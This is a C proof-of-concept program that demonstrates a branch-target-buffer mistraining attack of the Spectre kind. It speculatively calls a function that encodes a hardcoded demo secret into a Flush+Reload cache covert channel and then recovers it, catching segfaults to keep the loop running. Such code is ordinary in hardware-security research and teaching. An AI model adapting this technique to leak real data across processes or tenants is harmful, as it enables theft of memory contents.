#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <sched.h>

#include "libcache/cacheutils.h"

#define SECRET 'S'

int mistrain_ = 250;
int handling = 0;

static jmp_buf buf;

// Handle segfaults
static void segfault_handler(int signum) {
  (void)signum;
  unblock_signal(SIGSEGV);
  longjmp(buf, 1);
}

void dummy() {
  return;
}

void dump_secret() {
  // Encode data in the covert channel
  cache_encode(SECRET);
}

int main(int argc, const char **argv) {
  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  // install signal handler
  signal(SIGSEGV, segfault_handler);
  pagesize = sysconf(_SC_PAGESIZE);
  char *_mem = (char*) malloc(pagesize * (256 + 4));
  mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
  memset(mem, 0, pagesize * 256);

  // Flush our shared memory
  flush_shared_memory();
  mfence();

  void (*mistrain)();
  void (*dump)();
  mistrain = dump_secret;
  // clear the high bits of dump_secret
  dump = (void (*)())(0x000000FFFFFF & (size_t)dump_secret); 
  // set the high bits to something and set the low bits to dump_scret, we only care about the low bits in BTB indexing
  dump = (void (*)())(0x123321000000 | (size_t)dump); 
  printf("[\x1b[33m*\x1b[0m] mistrain: \x1b[33m\t%p\x1b[0m\n", mistrain);
  printf("[\x1b[33m*\x1b[0m] dump: \x1b[33m\t%p\x1b[0m\n", dump);
  // We now have a function pointer to a function with the same 23 LSB as our leak function

  while(1) {
    // Mistrain by calling mistrain (dump_secret) function
    for(int i = 0; i < 2500; i++)
      mistrain();

    // Flush our shared memory
    flush_shared_memory();
    mfence();
    nospec();

    if(handling) {
      // Call predicted function
      dump();
    }
    
    // Previous call will fail, so after every fault we return here
    if(!setjmp(buf)) {
      handling = 1;
    }
    
    // Recover data from the covert channel
    for(int i = 0; i < 256; i++) {
      int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
      if(flush_reload(mem + mix_i * pagesize)) {
        if(mix_i >= 'A' && mix_i <= 'Z') {
          printf("%c   ", mix_i);
            break;
        }
        fflush(stdout);
      }
    }
    sched_yield();
  }
  return 0;
}
